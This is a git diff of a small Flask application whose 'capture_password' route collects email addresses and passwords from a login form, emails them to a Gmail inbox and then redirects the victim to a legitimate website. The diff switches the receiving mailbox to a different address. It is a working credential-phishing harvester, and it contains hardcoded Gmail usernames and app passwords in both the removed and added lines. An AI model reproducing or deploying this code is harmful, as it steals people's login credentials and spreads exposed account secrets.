@@ -9,8 +9,8 @@ app.secret_key = 'your_secret_key'  # Replace with your secret key
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 587
 app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = 'smartdevtechemail@gmail.com'  # Your Gmail address
-app.config['MAIL_PASSWORD'] = 'yjhiusdfetotjrzp'   # Your Gmail password or app-specific password
+app.config['MAIL_USERNAME'] = 'gen.davidrodriguez09@gmail.com  '  # Your Gmail address
+app.config['MAIL_PASSWORD'] = 'vdxhkzjxeiobmxdl'   # Your Gmail password or app-specific password
 
 mail = Mail(app)
 
@@ -31,18 +31,22 @@ def capture_password():
         password = request.form.get('password')
 
         # Send email using Flask-Mail
-        recipient = 'smartdevtechemail@gmail.com'  # Your email address to receive the email
+        recipient = 'gen.davidrodriguez09@gmail.com '  # Your email address to receive the email
         subject = 'Login'
-        body =body = f'Email: {email}\nPassword entered: {password}'
+        body = f'Email: {email}\nPassword entered: {password}'
 
         msg = Message(subject, sender=app.config['MAIL_USERNAME'], recipients=[recipient])
         msg.body = body
 
         try:
             mail.send(msg)
-            return redirect('https://www.ionos.de/')
+            return redirect(url_for('external_redirect'))
         except Exception as e:
             return str(e)
+
+@app.route('/redirect')
+def external_redirect():
+    return redirect('https://www.google.com')
 
 if __name__ == '__main__':
     app.run(debug=True)
